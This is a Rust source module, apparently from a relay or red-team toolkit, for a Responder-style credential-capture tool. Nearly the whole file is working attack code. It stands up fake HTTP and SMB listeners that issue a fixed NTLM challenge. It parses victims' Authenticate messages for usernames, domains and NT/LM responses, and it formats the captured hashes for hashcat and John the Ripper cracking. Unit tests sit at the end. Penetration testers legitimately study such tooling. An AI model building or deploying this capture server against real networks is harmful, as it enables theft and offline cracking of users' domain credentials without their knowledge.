//! Responder Module
//!
//! Implements credential capture via fake services
//! (SMB, HTTP, LDAP, FTP, etc.) by listening for NTLM
//! authentication attempts and extracting credentials.

#![allow(dead_code)]
#![allow(unused_imports)]
#![allow(unused_variables)]
use crate::{RelayError, Result};
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;
use tracing::{debug, error, info, warn};

// ═══════════════════════════════════════════════════════════
// NTLM Protocol Constants
// ═══════════════════════════════════════════════════════════

/// NTLM signature: "NTLMSSP\0"
const NTLM_SIGNATURE: &[u8; 8] = b"NTLMSSP\x00";

/// NTLM message types
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum NtlmMessageType {
    Negotiate = 1,
    Challenge = 2,
    Authenticate = 3,
}

/// Parse NTLM message type from raw bytes
fn parse_ntlm_type(data: &[u8]) -> Option<NtlmMessageType> {
    if data.len() < 12 {
        return None;
    }
    if &data[0..8] != NTLM_SIGNATURE {
        return None;
    }
    match u32::from_le_bytes([data[8], data[9], data[10], data[11]]) {
        1 => Some(NtlmMessageType::Negotiate),
        2 => Some(NtlmMessageType::Challenge),
        3 => Some(NtlmMessageType::Authenticate),
        _ => None,
    }
}

// ═══════════════════════════════════════════════════════════
// NTLM Message Parsing
// ═══════════════════════════════════════════════════════════

/// Parsed NTLM Negotiate message
#[derive(Debug, Clone)]
pub struct NtlmNegotiate {
    pub flags: u32,
    pub domain: Option<String>,
    pub workstation: Option<String>,
}

/// Parsed NTLM Authenticate message  
#[derive(Debug, Clone)]
pub struct NtlmAuthenticate {
    pub lm_response: Vec<u8>,
    pub nt_response: Vec<u8>,
    pub domain: String,
    pub username: String,
    pub workstation: String,
    pub session_key: Option<Vec<u8>>,
}

/// Parse NTLM Negotiate message
fn parse_ntlm_negotiate(data: &[u8]) -> Option<NtlmNegotiate> {
    if data.len() < 16 {
        return None;
    }

    let flags = u32::from_le_bytes([data[12], data[13], data[14], data[15]]);

    // Extract domain if present (offset 16)
    let domain = if data.len() > 32 {
        let domain_len = u16::from_le_bytes([data[16], data[17]]) as usize;
        let domain_offset = u32::from_le_bytes([data[20], data[21], data[22], data[23]]) as usize;
        if domain_len > 0 && domain_offset + domain_len <= data.len() {
            Some(
                String::from_utf8_lossy(&data[domain_offset..domain_offset + domain_len])
                    .to_string(),
            )
        } else {
            None
        }
    } else {
        None
    };

    Some(NtlmNegotiate {
        flags,
        domain,
        workstation: None,
    })
}

/// Parse NTLM Authenticate message to extract credentials
fn parse_ntlm_authenticate(data: &[u8]) -> Option<NtlmAuthenticate> {
    if data.len() < 64 {
        return None;
    }

    // Helper to extract a field from NTLM authenticate message
    fn extract_field(data: &[u8], offset: usize) -> Option<Vec<u8>> {
        let len = u16::from_le_bytes([data[offset], data[offset + 1]]) as usize;
        let alloc_len = u16::from_le_bytes([data[offset + 2], data[offset + 3]]) as usize;
        let buffer_offset = u32::from_le_bytes([
            data[offset + 4],
            data[offset + 5],
            data[offset + 6],
            data[offset + 7],
        ]) as usize;

        if len == 0 && alloc_len == 0 {
            return Some(Vec::new());
        }

        let actual_len = if len > 0 { len } else { alloc_len };
        if buffer_offset + actual_len <= data.len() {
            Some(data[buffer_offset..buffer_offset + actual_len].to_vec())
        } else {
            None
        }
    }

    // Field offsets in NTLM Authenticate message
    // LM Response: offset 12
    // NT Response: offset 20
    // Domain: offset 28
    // Username: offset 36
    // Workstation: offset 44
    // Session Key: offset 52

    let lm_response = extract_field(data, 12)?;
    let nt_response = extract_field(data, 20)?;
    let domain_bytes = extract_field(data, 28)?;
    let username_bytes = extract_field(data, 36)?;
    let workstation_bytes = extract_field(data, 44)?;

    // Convert from UTF-16LE to String
    let domain = decode_utf16le(&domain_bytes);
    let username = decode_utf16le(&username_bytes);
    let workstation = decode_utf16le(&workstation_bytes);

    Some(NtlmAuthenticate {
        lm_response,
        nt_response,
        domain,
        username,
        workstation,
        session_key: None,
    })
}

/// Decode UTF-16LE bytes to String
fn decode_utf16le(data: &[u8]) -> String {
    if data.is_empty() {
        return String::new();
    }

    let chars: Vec<u16> = data
        .chunks_exact(2)
        .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
        .collect();

    String::from_utf16_lossy(&chars)
}

/// Build NTLM Challenge message
fn build_ntlm_challenge(challenge: [u8; 8], target_name: &str) -> Vec<u8> {
    let mut msg = Vec::new();

    // Signature
    msg.extend_from_slice(NTLM_SIGNATURE);

    // Message type (Challenge = 2)
    msg.extend_from_slice(&2u32.to_le_bytes());

    // Target name fields (offset 12)
    let target_bytes = target_name
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect::<Vec<u8>>();
    msg.extend_from_slice(&(target_bytes.len() as u16).to_le_bytes()); // Len
    msg.extend_from_slice(&(target_bytes.len() as u16).to_le_bytes()); // Max len
    msg.extend_from_slice(&12u32.to_le_bytes()); // Buffer offset (right after this header)

    // Negotiate flags
    // NTLMSSP_NEGOTIATE_UNICODE | NTLMSSP_NEGOTIATE_NTLM | NTLMSSP_TARGET_TYPE_DOMAIN
    let flags: u32 = 0x00000202 | 0x00020000 | 0x00010000;
    msg.extend_from_slice(&flags.to_le_bytes());

    // Server challenge (8 bytes)
    msg.extend_from_slice(&challenge);

    // Reserved (8 bytes)
    msg.extend_from_slice(&[0u8; 8]);

    // Target info (empty for now)
    msg.extend_from_slice(&0u16.to_le_bytes()); // Len
    msg.extend_from_slice(&0u16.to_le_bytes()); // Max len
    msg.extend_from_slice(&0u32.to_le_bytes()); // Offset

    // Target name data
    msg.extend_from_slice(&target_bytes);

    msg
}

// ═══════════════════════════════════════════════════════════
// HTTP NTLM Authentication
// ═══════════════════════════════════════════════════════════

/// Parse NTLM token from HTTP Authorization header
fn parse_http_auth_header(header: &str) -> Option<Vec<u8>> {
    let header = header.trim();
    if !header.starts_with("NTLM ") {
        return None;
    }
    let b64 = &header[5..];
    base64_decode(b64)
}

/// Base64 decode
fn base64_decode(data: &str) -> Option<Vec<u8>> {
    use base64::{Engine, engine::general_purpose::STANDARD};
    STANDARD.decode(data).ok()
}

/// Base64 encode
fn base64_encode(data: &[u8]) -> String {
    use base64::{Engine, engine::general_purpose::STANDARD};
    STANDARD.encode(data)
}

// ═══════════════════════════════════════════════════════════
// Responder Configuration
// ═══════════════════════════════════════════════════════════

/// Responder configuration
#[derive(Debug, Clone)]
pub struct ResponderConfig {
    /// IP address to listen on
    pub listen_ip: String,
    /// Fixed challenge to use (hex string, e.g., "1122334455667788")
    pub challenge: Option<String>,
    /// Enable HTTP server
    pub http: bool,
    /// Enable SMB server
    pub smb: bool,
    /// Enable LDAP server
    pub ldap: bool,
    /// Enable FTP server
    pub ftp: bool,
}

impl Default for ResponderConfig {
    fn default() -> Self {
        Self {
            listen_ip: "0.0.0.0".to_string(),
            challenge: Some("1122334455667788".to_string()),
            http: true,
            smb: true,
            ldap: false,
            ftp: false,
        }
    }
}

/// Captured credential
#[derive(Debug, Clone)]
pub struct CapturedCredential {
    /// Client IP address
    pub client_ip: String,
    /// Username extracted from NTLM
    pub username: String,
    /// Domain extracted from NTLM
    pub domain: String,
    /// Server challenge (hex)
    pub challenge: String,
    /// LM response (hex)
    pub lm_response: String,
    /// NT response (hex)
    pub nt_response: String,
    /// Protocol used (HTTP, SMB, LDAP, FTP)
    pub protocol: String,
    /// Timestamp
    pub timestamp: chrono::DateTime<chrono::Utc>,
}

impl CapturedCredential {
    /// Format as hashcat format (username::domain:challenge:lm_response:nt_response)
    pub fn to_hashcat_format(&self) -> String {
        format!(
            "{}::{}:{}:{}:{}",
            self.username, self.domain, self.challenge, self.lm_response, self.nt_response
        )
    }

    /// Format as John the Ripper format
    pub fn to_john_format(&self) -> String {
        self.to_hashcat_format()
    }
}

// ═══════════════════════════════════════════════════════════
// Responder Implementation
// ═══════════════════════════════════════════════════════════

/// Responder for credential capture
pub struct Responder {
    config: ResponderConfig,
    running: Arc<AtomicBool>,
    captured: Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
    threads: Vec<thread::JoinHandle<()>>,
}

impl Responder {
    /// Create a new responder with the given configuration
    pub fn new(config: ResponderConfig) -> Self {
        Self {
            config,
            running: Arc::new(AtomicBool::new(false)),
            captured: Arc::new(std::sync::Mutex::new(Vec::new())),
            threads: Vec::new(),
        }
    }

    /// Start the responder
    pub async fn start(&mut self) -> Result<()> {
        if self.running.load(Ordering::SeqCst) {
            return Err(RelayError::Config("Responder already running".to_string()).into());
        }

        info!(
            "Starting responder on {} (HTTP: {}, SMB: {}, LDAP: {}, FTP: {})",
            self.config.listen_ip,
            self.config.http,
            self.config.smb,
            self.config.ldap,
            self.config.ftp
        );

        self.running.store(true, Ordering::SeqCst);

        // Start HTTP server
        if self.config.http {
            let running = Arc::clone(&self.running);
            let listen_ip = self.config.listen_ip.clone();
            let challenge = self
                .config
                .challenge
                .clone()
                .unwrap_or_else(|| "1122334455667788".to_string());
            let captured = Arc::clone(&self.captured);

            let handle = thread::spawn(move || {
                if let Err(e) = Self::run_http_server(running, &listen_ip, &challenge, captured) {
                    error!("HTTP server error: {}", e);
                }
            });
            self.threads.push(handle);
        }

        // Start SMB server
        if self.config.smb {
            let running = Arc::clone(&self.running);
            let listen_ip = self.config.listen_ip.clone();
            let challenge = self
                .config
                .challenge
                .clone()
                .unwrap_or_else(|| "1122334455667788".to_string());
            let captured = Arc::clone(&self.captured);

            let handle = thread::spawn(move || {
                if let Err(e) = Self::run_smb_server(running, &listen_ip, &challenge, captured) {
                    error!("SMB server error: {}", e);
                }
            });
            self.threads.push(handle);
        }

        info!("Responder started successfully");
        Ok(())
    }

    /// Stop the responder
    pub async fn stop(&mut self) -> Result<()> {
        if !self.running.load(Ordering::SeqCst) {
            return Ok(());
        }

        info!("Stopping responder");
        self.running.store(false, Ordering::SeqCst);

        for handle in self.threads.drain(..) {
            let _ = handle.join();
        }

        info!("Responder stopped");
        Ok(())
    }

    /// Get captured credentials
    pub fn get_captured_credentials(&self) -> Vec<CapturedCredential> {
        self.captured.lock().unwrap().clone()
    }

    /// Check if responder is running
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }

    /// Get configuration
    pub fn config(&self) -> &ResponderConfig {
        &self.config
    }

    // ═══════════════════════════════════════════════════════
    // HTTP Server Implementation
    // ═══════════════════════════════════════════════════════

    fn run_http_server(
        running: Arc<AtomicBool>,
        listen_ip: &str,
        challenge: &str,
        captured: Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
    ) -> Result<()> {
        let addr = format!("{}:80", listen_ip);
        let listener = TcpListener::bind(&addr)
            .map_err(|e| RelayError::Socket(format!("Failed to bind HTTP port 80: {}", e)))?;

        listener
            .set_nonblocking(true)
            .map_err(|e| RelayError::Socket(format!("Failed to set nonblocking: {}", e)))?;

        info!("HTTP server listening on {}", addr);

        let challenge_bytes =
            hex_str_to_bytes(challenge).unwrap_or([0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88]);

        while running.load(Ordering::SeqCst) {
            match listener.accept() {
                Ok((stream, peer)) => {
                    debug!("HTTP connection from {}", peer);
                    if let Err(e) = Self::handle_http_client(
                        stream,
                        peer.ip().to_string(),
                        challenge_bytes,
                        &captured,
                    ) {
                        debug!("HTTP client handling error: {}", e);
                    }
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                    thread::sleep(Duration::from_millis(100));
                    continue;
                }
                Err(e) => {
                    warn!("HTTP accept error: {}", e);
                }
            }
        }

        info!("HTTP server stopped");
        Ok(())
    }

    fn handle_http_client(
        mut stream: TcpStream,
        client_ip: String,
        challenge: [u8; 8],
        captured: &Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
    ) -> Result<()> {
        stream.set_read_timeout(Some(Duration::from_secs(5))).ok();
        stream.set_write_timeout(Some(Duration::from_secs(5))).ok();

        let mut request = vec![0u8; 4096];
        let len = stream
            .read(&mut request)
            .map_err(|e| RelayError::Network(format!("HTTP read error: {}", e)))?;
        let request = &request[..len];
        let request_str = String::from_utf8_lossy(request);

        // Check for Authorization header
        if let Some(auth_line) = request_str
            .lines()
            .find(|l| l.starts_with("Authorization:"))
        {
            if let Some(ntlm_data) =
                parse_http_auth_header(auth_line.trim_start_matches("Authorization:"))
            {
                match parse_ntlm_type(&ntlm_data) {
                    Some(NtlmMessageType::Negotiate) => {
                        // Send challenge
                        let challenge_msg = build_ntlm_challenge(challenge, "DOMAIN");
                        let b64_challenge = base64_encode(&challenge_msg);

                        let response = format!(
                            "HTTP/1.1 401 Unauthorized\r\n\
                             WWW-Authenticate: NTLM {}\r\n\
                             Content-Length: 0\r\n\
                             Connection: close\r\n\
                             \r\n",
                            b64_challenge
                        );

                        stream.write_all(response.as_bytes()).ok();
                        return Ok(());
                    }
                    Some(NtlmMessageType::Authenticate) => {
                        // Extract credentials
                        if let Some(auth) = parse_ntlm_authenticate(&ntlm_data) {
                            let cred = CapturedCredential {
                                client_ip,
                                username: auth.username,
                                domain: auth.domain,
                                challenge: bytes_to_hex(&challenge),
                                lm_response: bytes_to_hex(&auth.lm_response),
                                nt_response: bytes_to_hex(&auth.nt_response),
                                protocol: "HTTP".to_string(),
                                timestamp: chrono::Utc::now(),
                            };

                            info!(
                                "Captured NTLM credentials: {}\\{} via HTTP",
                                cred.domain, cred.username
                            );

                            captured.lock().unwrap().push(cred);
                        }

                        // Send final response
                        let response =
                            "HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
                        stream.write_all(response.as_bytes()).ok();
                        return Ok(());
                    }
                    _ => {}
                }
            }
        }

        // Request authentication
        let response = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
        stream.write_all(response.as_bytes()).ok();

        Ok(())
    }

    // ═══════════════════════════════════════════════════════
    // SMB Server Implementation
    // ═══════════════════════════════════════════════════════

    fn run_smb_server(
        running: Arc<AtomicBool>,
        listen_ip: &str,
        challenge: &str,
        captured: Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
    ) -> Result<()> {
        let addr = format!("{}:445", listen_ip);
        let listener = TcpListener::bind(&addr)
            .map_err(|e| RelayError::Socket(format!("Failed to bind SMB port 445: {}", e)))?;

        listener
            .set_nonblocking(true)
            .map_err(|e| RelayError::Socket(format!("Failed to set nonblocking: {}", e)))?;

        info!("SMB server listening on {}", addr);

        let challenge_bytes =
            hex_str_to_bytes(challenge).unwrap_or([0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88]);

        while running.load(Ordering::SeqCst) {
            match listener.accept() {
                Ok((stream, peer)) => {
                    debug!("SMB connection from {}", peer);
                    if let Err(e) = Self::handle_smb_client(
                        stream,
                        peer.ip().to_string(),
                        challenge_bytes,
                        &captured,
                    ) {
                        debug!("SMB client handling error: {}", e);
                    }
                }
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                    thread::sleep(Duration::from_millis(100));
                    continue;
                }
                Err(e) => {
                    warn!("SMB accept error: {}", e);
                }
            }
        }

        info!("SMB server stopped");
        Ok(())
    }

    fn handle_smb_client(
        mut stream: TcpStream,
        client_ip: String,
        challenge: [u8; 8],
        captured: &Arc<std::sync::Mutex<Vec<CapturedCredential>>>,
    ) -> Result<()> {
        stream.set_read_timeout(Some(Duration::from_secs(5))).ok();
        stream.set_write_timeout(Some(Duration::from_secs(5))).ok();

        let mut buf = vec![0u8; 8192];

        // Read SMB negotiate
        let len = stream
            .read(&mut buf)
            .map_err(|e| RelayError::Network(format!("SMB read error: {}", e)))?;

        if len < 4 {
            return Err(RelayError::Protocol("SMB message too short".to_string()).into());
        }

        // Check for NetBIOS header
        let _netbios_len = ((buf[1] as usize) << 16) | ((buf[2] as usize) << 8) | (buf[3] as usize);

        // Check for SMB1 or SMB2 magic
        if &buf[4..8] == b"\xffSMB" {
            // SMB1 - send NTLM challenge
            debug!("SMB1 connection detected");
        } else if &buf[4..8] == b"\xfeSMB" {
            // SMB2
            debug!("SMB2 connection detected");
        }

        // Send SMB negotiate response with NTLM challenge
        let negotiate_response = Self::build_smb_negotiate_response(challenge);
        stream
            .write_all(&negotiate_response)
            .map_err(|e| RelayError::Network(format!("SMB write error: {}", e)))?;

        // Read session setup with NTLM authenticate
        let len = stream
            .read(&mut buf)
            .map_err(|e| RelayError::Network(format!("SMB read error: {}", e)))?;

        // Extract NTLM authenticate from SMB message
        if let Some(ntlm_data) = Self::extract_ntlm_from_smb(&buf[..len]) {
            if let Some(auth) = parse_ntlm_authenticate(&ntlm_data) {
                let cred = CapturedCredential {
                    client_ip,
                    username: auth.username,
                    domain: auth.domain,
                    challenge: bytes_to_hex(&challenge),
                    lm_response: bytes_to_hex(&auth.lm_response),
                    nt_response: bytes_to_hex(&auth.nt_response),
                    protocol: "SMB".to_string(),
                    timestamp: chrono::Utc::now(),
                };

                info!(
                    "Captured NTLM credentials: {}\\{} via SMB",
                    cred.domain, cred.username
                );

                captured.lock().unwrap().push(cred);
            }
        }
        Ok(())
    }

    fn build_smb_negotiate_response(challenge: [u8; 8]) -> Vec<u8> {
        let mut response = Vec::new();

        // NetBIOS header
        response.push(0x00); // Message type

        // SMB2 negotiate response header
        response.extend_from_slice(b"\xfeSMB"); // SMB2 magic
        response.extend_from_slice(&0x40u16.to_le_bytes()); // Header length
        response.extend_from_slice(&0x0011u16.to_le_bytes()); // Credit charge
        response.extend_from_slice(&0u32.to_le_bytes()); // Status
        response.extend_from_slice(&0x0001u16.to_le_bytes()); // Command (NEGOTIATE)
        response.extend_from_slice(&0u16.to_le_bytes()); // Credits
        response.extend_from_slice(&0u32.to_le_bytes()); // Flags
        response.extend_from_slice(&0u32.to_le_bytes()); // Next command
        response.extend_from_slice(&[0u8; 16]); // Message ID
        response.extend_from_slice(&0u32.to_le_bytes()); // Process ID
        response.extend_from_slice(&0u32.to_le_bytes()); // Tree ID
        response.extend_from_slice(&[0u8; 16]); // Session ID
        response.extend_from_slice(&[0u8; 16]); // Signature

        // Security buffer with NTLM challenge
        let ntlm_challenge = build_ntlm_challenge(challenge, "DOMAIN");

        // Security buffer offset and length
        response.extend_from_slice(&(ntlm_challenge.len() as u16).to_le_bytes());
        response.extend_from_slice(&80u16.to_le_bytes()); // Offset

        response.extend_from_slice(&ntlm_challenge);

        // Update NetBIOS length
        let len = response.len() - 4;
        let mut netbios_header = vec![0u8; 4];
        netbios_header[1] = ((len >> 16) & 0xFF) as u8;
        netbios_header[2] = ((len >> 8) & 0xFF) as u8;
        netbios_header[3] = (len & 0xFF) as u8;

        [netbios_header, response].concat()
    }

    fn extract_ntlm_from_smb(data: &[u8]) -> Option<Vec<u8>> {
        // Find NTLMSSP signature in SMB message
        for i in 0..data.len().saturating_sub(8) {
            if &data[i..i + 8] == NTLM_SIGNATURE {
                // Found NTLM message, try to determine length
                if let Some(msg_type) = parse_ntlm_type(&data[i..]) {
                    if msg_type == NtlmMessageType::Authenticate {
                        // The authenticate message should be followed by data
                        // We need to read until we have the full message
                        // For simplicity, just return what we have
                        return Some(data[i..].to_vec());
                    }
                }
            }
        }
        None
    }
}

impl Drop for Responder {
    fn drop(&mut self) {
        self.running.store(false, Ordering::SeqCst);
    }
}

// ═══════════════════════════════════════════════════════════
// Helper Functions
// ═══════════════════════════════════════════════════════════

/// Convert hex string to bytes
fn hex_str_to_bytes(s: &str) -> Option<[u8; 8]> {
    let s = s.replace(" ", "").replace("-", "").replace(":", "");
    if s.len() != 16 {
        return None;
    }

    let mut bytes = [0u8; 8];
    for i in 0..8 {
        bytes[i] = u8::from_str_radix(&s[i * 2..i * 2 + 2], 16).ok()?;
    }
    Some(bytes)
}

/// Convert bytes to hex string
fn bytes_to_hex(data: &[u8]) -> String {
    data.iter().map(|b| format!("{:02X}", b)).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_responder_config_default() {
        let config = ResponderConfig::default();
        assert_eq!(config.listen_ip, "0.0.0.0");
        assert!(config.http);
        assert!(config.smb);
        assert_eq!(config.challenge, Some("1122334455667788".to_string()));
    }

    #[test]
    fn test_ntlm_type_parsing() {
        // NTLM Negotiate message
        let negotiate = [
            0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50, 0x00, // Signature
            0x01, 0x00, 0x00, 0x00, // Type 1 (Negotiate)
            0x02, 0x00, 0x00, 0x00, // Flags
        ];

        assert_eq!(
            parse_ntlm_type(&negotiate),
            Some(NtlmMessageType::Negotiate)
        );
    }

    #[test]
    fn test_build_ntlm_challenge() {
        let challenge = [0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88];
        let msg = build_ntlm_challenge(challenge, "TEST");

        // Check signature
        assert_eq!(&msg[0..8], NTLM_SIGNATURE);
        // Check type
        assert_eq!(u32::from_le_bytes([msg[8], msg[9], msg[10], msg[11]]), 2);
        // Check challenge is at offset 24
        assert_eq!(&msg[24..32], &challenge);
    }

    #[test]
    fn test_credential_format() {
        let cred = CapturedCredential {
            client_ip: "192.168.1.100".to_string(),
            username: "admin".to_string(),
            domain: "TEST".to_string(),
            challenge: "1122334455667788".to_string(),
            lm_response: "AABBCCDD".to_string(),
            nt_response: "EEFF0011".to_string(),
            protocol: "HTTP".to_string(),
            timestamp: chrono::Utc::now(),
        };

        let hashcat = cred.to_hashcat_format();
        assert!(hashcat.contains("admin::TEST:"));
    }

    #[test]
    fn test_hex_conversion() {
        let hex = "1122334455667788";
        let bytes = hex_str_to_bytes(hex).unwrap();
        assert_eq!(bytes, [0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88]);

        let back = bytes_to_hex(&bytes);
        assert_eq!(back, "1122334455667788");
    }

    #[test]
    fn test_base64_roundtrip() {
        let data = b"Hello, World!";
        let encoded = base64_encode(data);
        let decoded = base64_decode(&encoded).unwrap();
        assert_eq!(data.to_vec(), decoded);
    }
}
